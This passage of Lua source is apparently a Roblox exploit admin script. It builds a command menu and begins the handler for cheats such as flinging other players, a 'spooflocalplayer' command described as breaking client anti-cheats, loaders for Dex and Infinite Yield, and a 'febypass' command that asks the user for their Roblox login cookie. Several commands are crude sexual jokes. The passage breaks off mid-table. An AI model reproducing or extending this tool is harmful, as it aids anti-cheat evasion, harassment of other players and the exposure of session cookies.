-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >graphics.Info
G2L["83"] = Instance.new("StringValue", G2L["82"]);
G2L["83"]["Name"] = [[Info]];
G2L["83"]["Value"] = [[Command Info: Graphics gui that sets your graphics like rtx or any others and has presets aswell which makes it pretty cool and has good lighting]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >febypass/<roblox cookie hash (for roblox api)>
G2L["84"] = Instance.new("TextButton", G2L["11"]);
G2L["84"]["TextWrapped"] = true;
G2L["84"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["84"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["84"]["TextSize"] = 14;
G2L["84"]["TextScaled"] = true;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["84"]["ZIndex"] = 2147483647;
G2L["84"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["84"]["BackgroundTransparency"] = 1;
G2L["84"]["Name"] = [[ >febypass/<roblox cookie hash (for roblox api)>]];
G2L["84"]["Text"] = [[ >febypass/<roblox cookie hash (for roblox api)>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >febypass/<roblox cookie hash (for roblox api)>.Info
G2L["85"] = Instance.new("StringValue", G2L["84"]);
G2L["85"]["Name"] = [[Info]];
G2L["85"]["Value"] = [[Command Info: This like looks way to legit to not be real... The reason it needs the roblox cookie hash because of me using roblox api to get the server ip since i couldnt find any other ways of getting the server ip to make it work]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vrsetup
G2L["86"] = Instance.new("TextButton", G2L["11"]);
G2L["86"]["TextWrapped"] = true;
G2L["86"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["86"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextScaled"] = true;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["ZIndex"] = 2147483647;
G2L["86"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["86"]["BackgroundTransparency"] = 1;
G2L["86"]["Name"] = [[ >vrsetup]];
G2L["86"]["Text"] = [[ >vrsetup]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vrsetup.Info
G2L["87"] = Instance.new("StringValue", G2L["86"]);
G2L["87"]["Name"] = [[Info]];
G2L["87"]["Value"] = [[Command Info: DO NOT USE VR UNTIL YOU ARE DONE SETTING THE THING UP]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >walkonwalls
G2L["88"] = Instance.new("TextButton", G2L["11"]);
G2L["88"]["TextWrapped"] = true;
G2L["88"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["88"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["88"]["TextSize"] = 14;
G2L["88"]["TextScaled"] = true;
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["ZIndex"] = 2147483647;
G2L["88"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["88"]["BackgroundTransparency"] = 1;
G2L["88"]["Name"] = [[ >walkonwalls]];
G2L["88"]["Text"] = [[ >walkonwalls]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >walkonwalls.Info
G2L["89"] = Instance.new("StringValue", G2L["88"]);
G2L["89"]["Name"] = [[Info]];
G2L["89"]["Value"] = [[Command Info: Become spiderman literally]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipscmds
G2L["8a"] = Instance.new("TextButton", G2L["11"]);
G2L["8a"]["TextWrapped"] = true;
G2L["8a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["8a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["8a"]["TextSize"] = 14;
G2L["8a"]["TextScaled"] = true;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["ZIndex"] = 2147483647;
G2L["8a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["8a"]["BackgroundTransparency"] = 1;
G2L["8a"]["Name"] = [[ >rochipscmds]];
G2L["8a"]["Text"] = [[ >rochipscmds]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipscmds.Info
G2L["8b"] = Instance.new("StringValue", G2L["8a"]);
G2L["8b"]["Name"] = [[Info]];
G2L["8b"]["Value"] = [[Command Info: Some goofy admin system I found randomly.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsadmin
G2L["8c"] = Instance.new("TextButton", G2L["11"]);
G2L["8c"]["TextWrapped"] = true;
G2L["8c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["8c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["8c"]["TextSize"] = 14;
G2L["8c"]["TextScaled"] = true;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8c"]["ZIndex"] = 2147483647;
G2L["8c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["8c"]["BackgroundTransparency"] = 1;
G2L["8c"]["Name"] = [[ >rochipsadmin]];
G2L["8c"]["Text"] = [[ >rochipsadmin]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsadmin.Info
G2L["8d"] = Instance.new("StringValue", G2L["8c"]);
G2L["8d"]["Name"] = [[Info]];
G2L["8d"]["Value"] = [[Command Info: Ermmm Admin panel I randomly found.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsuni
G2L["8e"] = Instance.new("TextButton", G2L["11"]);
G2L["8e"]["TextWrapped"] = true;
G2L["8e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["8e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["8e"]["TextSize"] = 14;
G2L["8e"]["TextScaled"] = true;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8e"]["ZIndex"] = 2147483647;
G2L["8e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["8e"]["BackgroundTransparency"] = 1;
G2L["8e"]["Name"] = [[ >rochipsuni]];
G2L["8e"]["Text"] = [[ >rochipsuni]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsuni.Info
G2L["8f"] = Instance.new("StringValue", G2L["8e"]);
G2L["8f"]["Name"] = [[Info]];
G2L["8f"]["Value"] = [[Command Info: Has so many features bro and its universal]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >jork
G2L["90"] = Instance.new("TextButton", G2L["11"]);
G2L["90"]["TextWrapped"] = true;
G2L["90"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["90"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["90"]["TextSize"] = 14;
G2L["90"]["TextScaled"] = true;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["90"]["ZIndex"] = 2147483647;
G2L["90"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["90"]["BackgroundTransparency"] = 1;
G2L["90"]["Name"] = [[ >jork]];
G2L["90"]["Text"] = [[ >jork]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >jork.Info
G2L["91"] = Instance.new("StringValue", G2L["90"]);
G2L["91"]["Name"] = [[Info]];
G2L["91"]["Value"] = [[Command Info: Why did I even add this bro... ITS JERKING OFF DAMN IT]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antibackshots
G2L["92"] = Instance.new("TextButton", G2L["11"]);
G2L["92"]["TextWrapped"] = true;
G2L["92"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["92"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["92"]["TextSize"] = 14;
G2L["92"]["TextScaled"] = true;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["92"]["ZIndex"] = 2147483647;
G2L["92"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["92"]["BackgroundTransparency"] = 1;
G2L["92"]["Name"] = [[ >antibackshots]];
G2L["92"]["Text"] = [[ >antibackshots]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antibackshots.Info
G2L["93"] = Instance.new("StringValue", G2L["92"]);
G2L["93"]["Name"] = [[Info]];
G2L["93"]["Value"] = [[Command Info: makes you turn around when someone does it to you and also makes you inch back and nod]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >autobackshots
G2L["94"] = Instance.new("TextButton", G2L["11"]);
G2L["94"]["TextWrapped"] = true;
G2L["94"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["94"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["94"]["TextSize"] = 14;
G2L["94"]["TextScaled"] = true;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["ZIndex"] = 2147483647;
G2L["94"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["94"]["BackgroundTransparency"] = 1;
G2L["94"]["Name"] = [[ >autobackshots]];
G2L["94"]["Text"] = [[ >autobackshots]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >autobackshots.Info
G2L["95"] = Instance.new("StringValue", G2L["94"]);
G2L["95"]["Name"] = [[Info]];
G2L["95"]["Value"] = [[Command Info: same as anti version but it also includes you backshotting too (why am i even saying this stuff anymore)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >reset
G2L["96"] = Instance.new("TextButton", G2L["11"]);
G2L["96"]["TextWrapped"] = true;
G2L["96"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["96"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["96"]["TextSize"] = 14;
G2L["96"]["TextScaled"] = true;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["ZIndex"] = 2147483647;
G2L["96"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["96"]["BackgroundTransparency"] = 1;
G2L["96"]["Name"] = [[ >reset]];
G2L["96"]["Text"] = [[ >reset]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >reset.Info
G2L["97"] = Instance.new("StringValue", G2L["96"]);
G2L["97"]["Name"] = [[Info]];
G2L["97"]["Value"] = [[Command Info: Breaks your joints basically]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >respawn
G2L["98"] = Instance.new("TextButton", G2L["11"]);
G2L["98"]["TextWrapped"] = true;
G2L["98"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["98"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["98"]["TextSize"] = 14;
G2L["98"]["TextScaled"] = true;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["98"]["ZIndex"] = 2147483647;
G2L["98"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["98"]["BackgroundTransparency"] = 1;
G2L["98"]["Name"] = [[ >respawn]];
G2L["98"]["Text"] = [[ >respawn]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >respawn.Info
G2L["99"] = Instance.new("StringValue", G2L["98"]);
G2L["99"]["Name"] = [[Info]];
G2L["99"]["Value"] = [[Command Info: I hope this works but what it basically does is it temporarily lowers the respawntime and kills you and stuff]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >resetp
G2L["9a"] = Instance.new("TextButton", G2L["11"]);
G2L["9a"]["TextWrapped"] = true;
G2L["9a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["9a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9a"]["TextSize"] = 14;
G2L["9a"]["TextScaled"] = true;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9a"]["ZIndex"] = 2147483647;
G2L["9a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["9a"]["BackgroundTransparency"] = 1;
G2L["9a"]["Name"] = [[ >resetp]];
G2L["9a"]["Text"] = [[ >resetp]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >resetp.Info
G2L["9b"] = Instance.new("StringValue", G2L["9a"]);
G2L["9b"]["Name"] = [[Info]];
G2L["9b"]["Value"] = [[Command Info: Uhhh it just is reset but teleports you back to og position]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >refresh
G2L["9c"] = Instance.new("TextButton", G2L["11"]);
G2L["9c"]["TextWrapped"] = true;
G2L["9c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["9c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9c"]["TextSize"] = 14;
G2L["9c"]["TextScaled"] = true;
G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9c"]["ZIndex"] = 2147483647;
G2L["9c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["9c"]["BackgroundTransparency"] = 1;
G2L["9c"]["Name"] = [[ >refresh]];
G2L["9c"]["Text"] = [[ >refresh]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >refresh.Info
G2L["9d"] = Instance.new("StringValue", G2L["9c"]);
G2L["9d"]["Name"] = [[Info]];
G2L["9d"]["Value"] = [[Command Info: same has respawn but puts you back to og pos]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scp173
G2L["9e"] = Instance.new("TextButton", G2L["11"]);
G2L["9e"]["TextWrapped"] = true;
G2L["9e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["9e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9e"]["TextSize"] = 14;
G2L["9e"]["TextScaled"] = true;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9e"]["ZIndex"] = 2147483647;
G2L["9e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["9e"]["BackgroundTransparency"] = 1;
G2L["9e"]["Name"] = [[ >scp173]];
G2L["9e"]["Text"] = [[ >scp173]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scp173.Info
G2L["9f"] = Instance.new("StringValue", G2L["9e"]);
G2L["9f"]["Name"] = [[Info]];
G2L["9f"]["Value"] = [[Command Info: become scp 173 idk]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spooflocalplayer
G2L["a0"] = Instance.new("TextButton", G2L["11"]);
G2L["a0"]["TextWrapped"] = true;
G2L["a0"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["a0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a0"]["TextSize"] = 14;
G2L["a0"]["TextScaled"] = true;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a0"]["ZIndex"] = 2147483647;
G2L["a0"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["a0"]["BackgroundTransparency"] = 1;
G2L["a0"]["Name"] = [[ >spooflocalplayer]];
G2L["a0"]["Text"] = [[ >spooflocalplayer]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spooflocalplayer.Info
G2L["a1"] = Instance.new("StringValue", G2L["a0"]);
G2L["a1"]["Name"] = [[Info]];
G2L["a1"]["Value"] = [[Command Info: breaks client anti cheats and maybe scripts too idk]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fakewallhop
G2L["a2"] = Instance.new("TextButton", G2L["11"]);
G2L["a2"]["TextWrapped"] = true;
G2L["a2"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["a2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a2"]["TextSize"] = 14;
G2L["a2"]["TextScaled"] = true;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["ZIndex"] = 2147483647;
G2L["a2"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["a2"]["BackgroundTransparency"] = 1;
G2L["a2"]["Name"] = [[ >fakewallhop]];
G2L["a2"]["Text"] = [[ >fakewallhop]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fakewallhop.Info
G2L["a3"] = Instance.new("StringValue", G2L["a2"]);
G2L["a3"]["Name"] = [[Info]];
G2L["a3"]["Value"] = [[Command Info: tricks peoples into thinking your doing it yourself also press H to activate and make sure to be in front of a wall facing it]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >ball
G2L["a4"] = Instance.new("TextButton", G2L["11"]);
G2L["a4"]["TextWrapped"] = true;
G2L["a4"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["a4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a4"]["TextSize"] = 14;
G2L["a4"]["TextScaled"] = true;
G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a4"]["ZIndex"] = 2147483647;
G2L["a4"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["a4"]["BackgroundTransparency"] = 1;
G2L["a4"]["Name"] = [[ >ball]];
G2L["a4"]["Text"] = [[ >ball]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >ball.Info
G2L["a5"] = Instance.new("StringValue", G2L["a4"]);
G2L["a5"]["Name"] = [[Info]];
G2L["a5"]["Value"] = [[Command Info: Become a rolling ball thing idk]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >infostuff
G2L["a6"] = Instance.new("TextButton", G2L["11"]);
G2L["a6"]["TextWrapped"] = true;
G2L["a6"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["a6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a6"]["TextSize"] = 14;
G2L["a6"]["TextScaled"] = true;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a6"]["ZIndex"] = 2147483647;
G2L["a6"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["a6"]["BackgroundTransparency"] = 1;
G2L["a6"]["Name"] = [[ >infostuff]];
G2L["a6"]["Text"] = [[ >infostuff]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >infostuff.Info
G2L["a7"] = Instance.new("StringValue", G2L["a6"]);
G2L["a7"]["Name"] = [[Info]];
G2L["a7"]["Value"] = [[Command Info: idk its a remake of something myworld made]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UICorner
G2L["a8"] = Instance.new("UICorner", G2L["10"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UIStroke
G2L["a9"] = Instance.new("UIStroke", G2L["10"]);
G2L["a9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a9"]["Color"] = Color3.fromRGB(0, 171, 255);


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UIDragDetector
G2L["aa"] = Instance.new("UIDragDetector", G2L["d"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
local function C_c()
local script = G2L["c"];
	-- not a complete rewrite but the commands system was rewritten
	--[[
	CREDITS THAT WERENT ORIGINALLY IN THE OG VERSION:
	Nameless Admin,
	Infinite Yield,
	some dude named X,
	E God,
	More idk I forgot
	]]
	
	local cmdlist = script.Parent.Parent.CmdFrame
	local cmdbar = script.Parent
	local input = cmdbar.Input
	local output = cmdbar.Output
	
	local Loopmute = false
	local Loopglitch = false
	local flinging = false
	local Clip = true
	local floatName = "dfkjygsahfyvfnw7f8n538dnd4tgregw6er78red48hx35t6rgn8eewi"
	local TPWalk = false
	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
	local Direction = Vector3.new(0,0,0)
	local InterpolatedDir = Direction
	local Tilt = 0
	local InterpolatedTilt = Tilt
	local RunService = game:GetService("RunService")
	local Toggled = false
	local Sprinting = false
	local CameraPos = workspace.CurrentCamera.CFrame.Position
	local LastPos = nil
	local tflyCORE = nil
	local TFlyEnabled = false
	local TFspeed = 10
	
	local plrserv = game:GetService("Players")
        local tempplr = plrserv.LocalPlayer
	local tempchar = tempplr.Character or tempplr.CharacterAdded:Wait()
	local temphum = tempchar:FindFirstChildWhichIsA("Humanoid",true)
        local c = tempchr
	local p = tempplr
	local h = temphum

	local IsOnMobile = false
	local IsOnPC = false

	local speaker = p
	local RunService = game:GetService("RunService")
	
	local prefix = ">"
	
	local pm = p:GetMouse()

	if game:GetService("UserInputService").TouchEnabled then
		IsOnMobile = true
	end

	if game:GetService("UserInputService").KeyboardEnabled then
		IsOnPC = true
	end
	
	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end
	
	function Lerp(a, b, t)
		return a + (b - a) * t
	end
	
	local getPlr = function(Name)
		local Players = game:GetService("Players")
		if Name:lower() == "random" then
			return Players:GetPlayers()[math.random(#Players:GetPlayers())]
		else
			Name = Name:lower():gsub("%s", "")
			for _, x in next, Players:GetPlayers() do
				if x.Name:lower():match(Name) then
					return x
				elseif x.DisplayName:lower():match("^" .. Name) then
					return x
				end
			end
		end
	end
	
	pm.KeyDown:Connect(function(key)
		if key == "-" then
			input:CaptureFocus()
			task.spawn(function()
				game:GetService("RunService").RenderStepped:Wait()
				input.Text = prefix
			end)
		end
	end)
	
	local allcmds = {
		punch = {"punch","punchfling","flingpunch","hit","slap"},
		dex = {"dex","dexexplorer","dexbypass","dexv3","dexexplorerv3"},
		iy = {"iy","infyield","infiniteyield"},
		cmds = {"cmds","cmdslist","commands","commandslist"},
		uncmds = {"uncmds","uncmdslist","uncommands","uncommandslist","closecmds","closecommands"},
		cmdx = {"cmdx","commandx"},
		namelessadmin = {"na","nla","nameless","namelessadmin"},
		spinfling = {"sf","spinf","sfling","spinfling"},
		unspinfling = {"usf","unsf","unspinf","unsfling","unspinfling"},
		fling = {"fl","fling","fling1"},
		noclipfling = {"nf","nfl","nfling","noclipfling","fling2"},
		expandchat = {"ec","expandc","expandchat"},
		eclipsehub = {"ecl","eclipse","eclipsehub"},
